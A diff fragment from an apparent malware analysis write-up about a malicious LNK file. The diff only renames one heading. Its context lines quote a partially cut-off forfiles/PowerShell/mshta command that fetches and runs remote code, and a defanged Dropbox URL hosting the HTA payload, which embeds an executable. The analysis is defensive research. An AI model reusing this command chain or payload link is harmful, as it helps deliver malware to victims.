@@ -17,7 +17,7 @@ C:\Windows\System32\forfiles.exe /p C:\Windows\Vss /c "powershell start mshta ht
 
 When the LNK file is executed, a file is being downloaded from 'hxxps[://]dl.dropboxusercontent[.]com/scl/fi/aur0asu195akuhc7q88lq/mlwr?rlkey=ltpi9kve7882q0vksvvb54han' and executed against mshta, meaning the payload is very likely a HTA file (Microsoft HTML Application)
 
-## HTA File
+## HTA Script
 
 The [payload](https://www.virustotal.com/gui/file/302ec5af12ccc15b5771b3ed2b951ddc708f757c2103a1d6e71790f03902025e/detection) seems to contain a lot of junk characters at the start, it then has script tags which mshta will read and execute, followed by an MZ Header, indicating a portable executable.
 
